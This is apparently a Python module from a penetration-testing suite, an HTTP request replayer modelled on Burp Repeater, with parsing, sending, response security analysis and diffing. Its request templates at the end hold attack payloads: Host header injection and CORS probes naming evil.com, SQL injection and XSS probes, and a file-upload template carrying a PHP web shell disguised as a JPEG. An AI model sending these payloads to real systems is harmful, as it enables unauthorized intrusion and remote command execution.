"""
TeamCyberOps Suite v4 — HTTP Request Replayer
Like Burp Repeater — send/modify raw HTTP requests and analyze responses
"""
import urllib.request, urllib.error, urllib.parse
import http.client, ssl, socket, json, time, re
from datetime import datetime
from pathlib import Path

# ══════════════════════════════════════════════════════════════
#  RAW HTTP REQUEST PARSER
# ══════════════════════════════════════════════════════════════

def parse_raw_request(raw: str) -> dict:
    """Parse raw HTTP request text into components."""
    lines = raw.replace('\r\n', '\n').split('\n')
    if not lines:
        return {}

    # Request line
    req_line = lines[0].strip()
    parts = req_line.split(' ')
    method  = parts[0] if len(parts) > 0 else 'GET'
    path    = parts[1] if len(parts) > 1 else '/'
    version = parts[2] if len(parts) > 2 else 'HTTP/1.1'

    # Headers
    headers = {}
    body_start = len(lines)
    host = ''
    for i, line in enumerate(lines[1:], 1):
        if line.strip() == '':
            body_start = i + 1
            break
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip()] = v.strip()
            if k.strip().lower() == 'host':
                host = v.strip()

    # Body
    body = '\n'.join(lines[body_start:]).strip()

    # Determine scheme
    scheme = 'https'
    port   = 443
    if host:
        if ':' in host:
            h, p = host.rsplit(':', 1)
            try:
                port = int(p)
                host = h
                scheme = 'http' if port == 80 else 'https'
            except ValueError:
                pass

    return {
        'method':  method,
        'path':    path,
        'version': version,
        'host':    host,
        'scheme':  scheme,
        'port':    port,
        'headers': headers,
        'body':    body,
        'url':     f"{scheme}://{host}{path}",
    }


def build_raw_request(method: str, url: str, headers: dict,
                       body: str = '') -> str:
    """Build raw HTTP request text."""
    parsed = urllib.parse.urlparse(url)
    path   = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    host   = parsed.netloc

    lines = [f"{method} {path} HTTP/1.1"]
    if 'Host' not in headers and 'host' not in headers:
        lines.append(f"Host: {host}")

    for k, v in headers.items():
        lines.append(f"{k}: {v}")

    if body:
        if 'Content-Length' not in headers:
            lines.append(f"Content-Length: {len(body.encode())}")
        lines.append('')
        lines.append(body)
    else:
        lines.append('')

    return '\r\n'.join(lines)


# ══════════════════════════════════════════════════════════════
#  HTTP REQUEST SENDER
# ══════════════════════════════════════════════════════════════

def send_request(parsed: dict, timeout: int = 30,
                 follow_redirects: bool = True,
                 proxy_host: str = '', proxy_port: int = 8080,
                 verify_ssl: bool = False) -> dict:
    """Send an HTTP request and return full response."""
    start = time.time()

    try:
        url    = parsed['url']
        method = parsed.get('method', 'GET')
        headers = dict(parsed.get('headers', {}))
        body    = parsed.get('body', '')

        # Build urllib request
        body_bytes = body.encode('utf-8') if body else None

        req = urllib.request.Request(url, data=body_bytes, method=method)

        # Set headers
        for k, v in headers.items():
            req.add_header(k, v)

        # SSL context
        ctx = ssl.create_default_context()
        if not verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE

        # Proxy setup
        if proxy_host and proxy_port:
            handler = urllib.request.ProxyHandler({
                'http':  f"http://{proxy_host}:{proxy_port}",
                'https': f"http://{proxy_host}:{proxy_port}",
            })
            opener = urllib.request.build_opener(handler,
                         urllib.request.HTTPSHandler(context=ctx))
        else:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx))

        if not follow_redirects:
            opener.add_handler(NoRedirect())

        with opener.open(req, timeout=timeout) as resp:
            body_bytes_resp = resp.read()
            try:
                resp_body = body_bytes_resp.decode('utf-8', errors='replace')
            except Exception:
                resp_body = repr(body_bytes_resp[:2000])

            elapsed = round((time.time() - start) * 1000)
            resp_headers = dict(resp.getheaders())

            return {
                'status_code':    resp.status,
                'reason':         resp.reason,
                'headers':        resp_headers,
                'body':           resp_body,
                'size':           len(body_bytes_resp),
                'time_ms':        elapsed,
                'url':            resp.url,
                'redirect_count': 0,
                'error':          None,
            }

    except urllib.error.HTTPError as e:
        elapsed = round((time.time() - start) * 1000)
        try:
            err_body = e.read().decode('utf-8', errors='replace')
        except Exception:
            err_body = str(e)
        return {
            'status_code': e.code,
            'reason':      e.reason,
            'headers':     dict(e.headers) if e.headers else {},
            'body':        err_body,
            'size':        len(err_body),
            'time_ms':     elapsed,
            'url':         parsed.get('url',''),
            'error':       None,
        }
    except Exception as e:
        return {
            'status_code': 0,
            'reason':      'Error',
            'headers':     {},
            'body':        '',
            'size':        0,
            'time_ms':     round((time.time() - start) * 1000),
            'url':         parsed.get('url',''),
            'error':       str(e),
        }


class NoRedirect(urllib.request.HTTPErrorProcessor):
    """Prevent following redirects."""
    def http_response(self, request, response):
        return response
    https_response = http_response


# ══════════════════════════════════════════════════════════════
#  RESPONSE ANALYZER
# ══════════════════════════════════════════════════════════════

def analyze_response(resp: dict) -> dict:
    """Analyze HTTP response for security issues."""
    issues  = []
    headers = resp.get('headers', {})
    body    = resp.get('body', '')
    code    = resp.get('status_code', 0)
    headers_lower = {k.lower(): v for k, v in headers.items()}

    # Missing security headers
    sec_headers = {
        'x-frame-options':        'Missing X-Frame-Options (Clickjacking)',
        'x-content-type-options': 'Missing X-Content-Type-Options',
        'strict-transport-security': 'Missing HSTS header',
        'content-security-policy': 'Missing Content-Security-Policy',
        'x-xss-protection':       'Missing X-XSS-Protection',
        'referrer-policy':        'Missing Referrer-Policy',
    }
    for hdr, msg in sec_headers.items():
        if hdr not in headers_lower:
            issues.append({'type': 'Missing Header', 'severity': 'LOW',
                           'detail': msg})

    # Information disclosure
    server = headers_lower.get('server', '')
    if server and any(v in server for v in ['Apache/2', 'nginx/', 'IIS/']):
        issues.append({'type': 'Version Disclosure', 'severity': 'LOW',
                       'detail': f'Server header: {server}'})

    x_powered = headers_lower.get('x-powered-by', '')
    if x_powered:
        issues.append({'type': 'Version Disclosure', 'severity': 'LOW',
                       'detail': f'X-Powered-By: {x_powered}'})

    # Sensitive data in response
    sensitive_patterns = {
        'AWS Key':      r'AKIA[0-9A-Z]{16}',
        'Email':        r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        'Private Key':  r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
        'JWT':          r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
        'SQL Error':    r'(SQL syntax|mysql_fetch|ORA-\d{5}|SQLSTATE)',
        'Stack Trace':  r'(Traceback|at line \d+|System\.Web|Exception in thread)',
    }
    for name, pattern in sensitive_patterns.items():
        if re.search(pattern, body):
            sev = 'CRITICAL' if name in ('AWS Key', 'Private Key') else 'MEDIUM'
            issues.append({'type': 'Info Disclosure', 'severity': sev,
                           'detail': f'{name} found in response body'})

    # CORS
    cors = headers_lower.get('access-control-allow-origin', '')
    if cors == '*':
        issues.append({'type': 'CORS Wildcard', 'severity': 'MEDIUM',
                       'detail': 'Access-Control-Allow-Origin: *'})
    elif cors and 'evil' in cors.lower():
        issues.append({'type': 'CORS Reflected', 'severity': 'HIGH',
                       'detail': f'CORS Origin reflected: {cors}'})

    # Cookie flags
    for hdr_name, hdr_val in headers.items():
        if hdr_name.lower() == 'set-cookie':
            if 'httponly' not in hdr_val.lower():
                issues.append({'type': 'Cookie Missing HttpOnly', 'severity': 'MEDIUM',
                               'detail': hdr_val[:80]})
            if 'secure' not in hdr_val.lower():
                issues.append({'type': 'Cookie Missing Secure', 'severity': 'LOW',
                               'detail': hdr_val[:80]})

    return {
        'issues':       issues,
        'issue_count':  len(issues),
        'critical':     sum(1 for i in issues if i['severity'] == 'CRITICAL'),
        'high':         sum(1 for i in issues if i['severity'] == 'HIGH'),
        'medium':       sum(1 for i in issues if i['severity'] == 'MEDIUM'),
        'response_summary': {
            'server':   server,
            'x_powered': x_powered,
            'cors':     cors,
            'csp':      headers_lower.get('content-security-policy', 'none'),
            'hsts':     headers_lower.get('strict-transport-security', 'none'),
        }
    }


# ══════════════════════════════════════════════════════════════
#  DIFF ENGINE
# ══════════════════════════════════════════════════════════════

def diff_responses(resp1: dict, resp2: dict) -> dict:
    """Compare two HTTP responses for differences."""
    import difflib
    body1 = resp1.get('body', '')
    body2 = resp2.get('body', '')

    differ = difflib.unified_diff(
        body1.splitlines(keepends=True),
        body2.splitlines(keepends=True),
        fromfile='Response 1',
        tofile='Response 2',
        n=3
    )
    diff_text = ''.join(list(differ))

    return {
        'size_diff':    len(body2) - len(body1),
        'time_diff_ms': resp2.get('time_ms', 0) - resp1.get('time_ms', 0),
        'status_diff':  resp1.get('status_code') != resp2.get('status_code'),
        'body_changed': body1 != body2,
        'diff_text':    diff_text[:5000],
        'added_lines':  diff_text.count('\n+') - diff_text.count('\n+++'),
        'removed_lines': diff_text.count('\n-') - diff_text.count('\n---'),
    }


# ══════════════════════════════════════════════════════════════
#  REQUEST TEMPLATES
# ══════════════════════════════════════════════════════════════

REQUEST_TEMPLATES = {
    "Basic GET": "GET {url} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
    "POST JSON": "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/json\r\nContent-Length: {len}\r\n\r\n{body}",
    "POST Form": "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len}\r\n\r\n{body}",
    "With Auth Bearer": "GET {path} HTTP/1.1\r\nHost: {host}\r\nAuthorization: Bearer TOKEN_HERE\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "With Cookie": "GET {path} HTTP/1.1\r\nHost: {host}\r\nCookie: session=SESSION_ID\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "CORS Test": "GET {path} HTTP/1.1\r\nHost: {host}\r\nOrigin: https://evil.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "Host Header Injection": "GET {path} HTTP/1.1\r\nHost: evil.com\r\nX-Forwarded-Host: evil.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "SQLi Test": "GET {path}?id=1' HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "XSS Test": "GET {path}?q=<script>alert(1)</script> HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "File Upload": "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: multipart/form-data; boundary=----Boundary\r\n\r\n------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['c']); ?>\r\n------Boundary--",
}
